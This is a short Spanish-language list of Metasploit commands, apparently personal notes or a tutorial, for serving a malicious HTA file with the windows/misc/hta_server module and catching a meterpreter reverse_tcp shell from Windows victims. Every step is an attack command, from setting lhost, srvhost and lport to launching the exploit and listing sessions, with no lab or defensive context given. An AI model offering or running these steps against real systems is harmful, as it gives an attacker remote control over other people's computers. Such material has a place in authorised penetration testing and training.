1. Iniciamos msfconsole -> `msfconsole`
2. Usamos el exploit HTA_SEVER -> `use exploit/windows/misc/hta_server`
3. Conectamos nuestra IP -> `set lhost (tu ip)`
4. Establecemos el reverse_tcp -> `set payload windows/meterpreter/reverse_tcp`
5. Establecemos el host del servidor (nosotros) -> `set srvhost (tu ip)`
6. Establecemos el puerto (cualquiera que no este en uso) -> `set lport 8111`
7. Empezamos el exploit -> `exploit`
8. Y ya podemos ver los comandos que podemos usar usando el comando `help`
9. Para ver las sesiones activas -> `sessions`
